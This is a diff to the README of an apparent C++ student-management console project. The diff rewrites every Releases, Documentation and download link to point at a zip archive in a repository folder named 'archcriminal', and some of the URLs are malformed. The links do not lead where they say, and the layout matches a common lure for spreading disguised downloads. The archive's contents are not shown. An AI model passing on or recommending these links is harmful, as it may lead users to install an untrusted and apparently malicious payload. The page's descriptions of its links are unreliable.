@@ -1,6 +1,6 @@
 # 🎓 Cpp-student-management-system - Simplify Student Management Easily
 
-[![Download the latest release](https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip%https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip)](https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip)
+[![Download the latest release](https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip%https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip)](https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip)
 
 ## 📖 Description
 Cpp-student-management-system is a console-based application designed to manage student information efficiently. It uses C++ programming and integrates essential concepts like object-oriented programming and file handling. This software allows users to easily add, update, and view student records.
@@ -8,7 +8,7 @@ Cpp-student-management-system is a console-based application designed to manage 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software. 
 
-[Download the Latest Release](https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip)
+[Download the Latest Release](https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip)
 
 ## 🖥️ System Requirements
 - Operating System: Windows 7 or later.
@@ -18,7 +18,7 @@ To get started, visit the Releases page to download the software.
 - C++ Runtime: Ensure you have a compatible C++ runtime environment.
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip).
    
 2. **Download the Latest Version**: Click on the most recent version to download the installer.
 
@@ -56,7 +56,7 @@ To get started, visit the Releases page to download the software.
 If you encounter any issues while using the software, please feel free to reach out for support. You can open an issue on the GitHub repository or directly contact the maintainer.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip)
-- [Documentation](https://raw.githubusercontent.com/paripon2001/Cpp-student-management-system/main/archcriminal/Cpp-student-management-system-v2.1.zip)
+- [Releases Page](https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip)
+- [Documentation](https://github.com/paripon2001/Cpp-student-management-system/raw/refs/heads/main/archcriminal/Cpp_student_management_system_2.7.zip)
 
 Thank you for choosing Cpp-student-management-system for your student management needs!
